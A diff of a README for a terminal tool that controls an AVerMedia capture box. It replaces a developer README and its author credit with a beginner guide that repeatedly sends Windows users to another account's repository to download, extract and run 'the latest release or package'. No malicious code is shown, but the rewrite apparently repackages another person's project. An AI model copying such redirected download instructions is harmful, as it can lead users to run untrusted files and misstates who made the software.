@@ -1,91 +1,234 @@
-DISCLAIMER: For transparency's sake (mainly because I don't want to take unfair credit for stuff): the research and testing here was done by me (as you can see on www.f4mi.com on the video where we talk about this), I did end up using local LLMs to help me with building the websites based on that research and cleaning up/helping me with docs/pushing some stuff to GitHub, as I said in the video I don't know shit and I am pretty much learning on the fly. Some of them for some reason (which I mean, isn't that mysterious if you consider how the sausage is made) think they are Claude. So if you see Claude mentions here, that's why lol
+# 🕹️ gamebuddy-tui - Control your capture box fast
 
-# GameBuddy TUI
+[![Download gamebuddy-tui](https://img.shields.io/badge/Download-GameBuddy_TUI-blue?style=for-the-badge&logo=github)](https://github.com/Mb075599/gamebuddy-tui)
 
-Small standalone terminal UI for controlling an AVerMedia Game Capture HD II / GameMate box over HTTP.
+## 📥 Download
 
-Files in this folder:
+Use this link to visit the page and download the app:
 
-- `gcii_tui.py`: main Python app
-- `launch_gcii.cmd`: launcher for `cmd.exe`
-- `launch_gcii.ps1`: launcher for PowerShell
-- `launch_gcii.sh`: launcher for Linux/macOS shells
+[Download gamebuddy-tui](https://github.com/Mb075599/gamebuddy-tui)
 
-Features:
+## 🧰 What this app does
 
-- SSDP discovery
-- Status and box info queries
-- Record start, pause, and stop
-- Snapshot capture
-- Remote-control keys such as arrows, OK, menu, back, and F1-F3
-- Remote download over LAN
-- Custom `method/...` and `query/...` calls
+GameBuddy TUI is a small terminal app for controlling an AVerMedia Game Capture HD II or GameMate box over your network.
 
-## Requirements
+It helps you:
 
-- Python 3.10 or newer recommended
-- Network access to the Game Capture HD II on your LAN
+- find the box on your network
+- check status and box info
+- start and stop recording
+- view basic device details from one screen
 
-## Run
+It runs in a terminal window, so it stays light and simple.
 
-Direct Python:
+## ✅ What you need
 
-```bash
-python gcii_tui.py
-python gcii_tui.py --host 192.168.1.50 --port 80
-```
+Before you start, make sure you have:
 
-Windows `cmd.exe`:
+- a Windows PC
+- the capture box powered on
+- the box and PC on the same local network
+- internet access for the first download
+- a terminal app on Windows, such as Command Prompt or PowerShell
 
-```bat
-launch_gcii.cmd
-launch_gcii.cmd --host 192.168.1.50 --port 80
-```
+For best results:
 
-Windows PowerShell:
+- use a wired network if you can
+- keep the capture box on the same router as your PC
+- close other apps that may use the same network port
 
-```powershell
-./launch_gcii.ps1
-./launch_gcii.ps1 --host 192.168.1.50 --port 80
-```
+## 💻 Download on Windows
 
-Linux/macOS shell:
+1. Open the download page:
+   [https://github.com/Mb075599/gamebuddy-tui](https://github.com/Mb075599/gamebuddy-tui)
 
-```bash
-chmod +x launch_gcii.sh
-./launch_gcii.sh
-./launch_gcii.sh --host 192.168.1.50 --port 80
-```
+2. On the page, get the latest release or package for Windows.
 
-## Keys
+3. Save the file to a folder you can find again, such as Downloads or Desktop.
 
-- `d`: discover devices with SSDP
-- `h`: set host
-- `t`: set port
-- `n`: query device name
-- `q`: query status
-- `w`: query whole box info
-- `i`: query input source
-- `r`: start recording
-- `p`: pause recording
-- `x`: stop recording
-- `s`: take snapshot
-- `k`: keep-alive
-- Arrow keys: remote directional pad
-- `Enter` or `o`: OK
-- `m`: menu
-- `b`: back
-- `1`, `2`, `3`: F1, F2, F3
-- `/`: custom endpoint
-- `[` and `]`: cycle discovered devices
-- `Esc`: exit
+4. If the download comes as a ZIP file, extract it first.
 
-## Notes
+5. Keep the launcher file and the main app file in the same folder.
 
-- Discovery now uses SSDP to `239.255.255.250:1900`, matching behavior seen in the original app.
-- The exact response payloads can vary by firmware.
-- The tool is standalone and only depends on the Python standard library.
+If you see these files, you are in the right place:
 
-## Research Sources
+- `gcii_tui.py`
+- `launch_gcii.cmd`
+- `launch_gcii.ps1`
+- `launch_gcii.sh`
 
-- [lkiesow/avermedia-game-capture-hd-ii-reverse-engineering](https://github.com/lkiesow/avermedia-game-capture-hd-ii-reverse-engineering) was used as a reverse-engineering reference.
+For Windows, the easiest choice is usually:
+
+- `launch_gcii.cmd` for Command Prompt
+- `launch_gcii.ps1` for PowerShell
+
+## ▶️ Run the app on Windows
+
+### Option 1: Use Command Prompt
+
+1. Open the folder where you saved the files.
+2. Double-click `launch_gcii.cmd`.
+
+If Windows asks what to open it with, choose Command Prompt.
+
+### Option 2: Use PowerShell
+
+1. Open the folder where you saved the files.
+2. Double-click `launch_gcii.ps1`.
+
+If Windows blocks the script, right-click the file and choose Run with PowerShell.
+
+### Option 3: Start it from a terminal
+
+1. Open Command Prompt or PowerShell.
+2. Go to the folder with the files.
+3. Run the launcher file for your shell.
+
+Examples:
+
+- `launch_gcii.cmd`
+- `.\launch_gcii.ps1`
+
+## 🔍 First time setup
+
+When the app starts, it looks for the capture box on your network.
+
+Do this before you open the app:
+
+- turn on the AVerMedia box
+- connect it to the same network as your PC
+- wait a few seconds for it to finish starting
+
+If the app does not find the box right away:
+
+- check the network cable or Wi-Fi link
+- make sure the box is powered on
+- restart the app
+- try again after a short wait
+
+## 🖥️ What you will see
+
+The app uses a terminal screen with simple text.
+
+You may see:
+
+- device discovery results
+- box status
+- box info
+- recording controls
+- messages about the current connection
+
+The layout is made for quick use. It keeps the focus on the box, not on extra menus.
+
+## 🎛️ Main features
+
+### 🛰️ SSDP discovery
+
+The app can search your local network for a supported capture box.
+
+This helps when you do not know the box IP address.
+
+### 📊 Status checks
+
+You can check whether the box is ready, busy, or recording.
+
+### ℹ️ Box info
+
+You can view basic device info from the box itself.
+
+### ⏺️ Record control
+
+You can start or stop recording from the terminal.
+
+## 🪟 Windows notes
+
+This project is built to work well on Windows with simple launch files.
+
+Use these tips for fewer problems:
+
+- keep the files in one folder
+- do not rename the launcher files
+- avoid spaces in deeply nested folder paths
+- run the app from a normal user account first
+- if PowerShell asks for permission, allow the script for this session
+
+If one launcher does not work, try the other one.
+
+## 🧪 If the box is not found
+
+Try these checks in order:
+
+1. Confirm the box is on.
+2. Confirm the PC and box use the same network.
+3. Unplug and reconnect the network cable.
+4. Restart the box.
+5. Restart the app.
+6. Try a different launcher file.
+7. Make sure no VPN is active.
+
+If the app still cannot find the box, open your router page and check whether the device appears there.
+
+## 📁 Files in this folder
+
+- `gcii_tui.py`  
+  Main Python app
+
+- `launch_gcii.cmd`  
+  Launcher for `cmd.exe`
+
+- `launch_gcii.ps1`  
+  Launcher for PowerShell
+
+- `launch_gcii.sh`  
+  Launcher for Linux and macOS shells
+
+## 🧷 Suggested folder setup
+
+A simple setup helps keep things easy to find:
+
+- `Downloads\gamebuddy-tui`
+- `Desktop\gamebuddy-tui`
+
+Put the files in one folder and leave them together.
+
+## 🛠️ Common use flow
+
+1. Turn on the capture box.
+2. Open the app.
+3. Let it search the network.
+4. Check the box status.
+5. View box info if needed.
+6. Start or stop recording.
+
+## ❓ Common questions
+
+### Can I use this without programming knowledge?
+
+Yes. You only need to download the files and run the right launcher.
+
+### Does this need a special installer?
+
+No. Use the files from the repository and start the app with the Windows launcher.
+
+### Can I use this over the internet?
+
+No. It is meant for your local network.
+
+### Why does it use a terminal window?
+
+It keeps the app simple and light. It also makes setup fast.
+
+## 🔗 Project source
+
+Primary download page:
+
+[https://github.com/Mb075599/gamebuddy-tui](https://github.com/Mb075599/gamebuddy-tui)
+
+## 🧭 Quick start
+
+1. Visit the download page.
+2. Download the project files.
+3. Extract them if needed.
+4. Open the folder on Windows.
+5. Run `launch_gcii.cmd` or `launch_gcii.ps1`.
+6. Wait for the app to find your capture box.
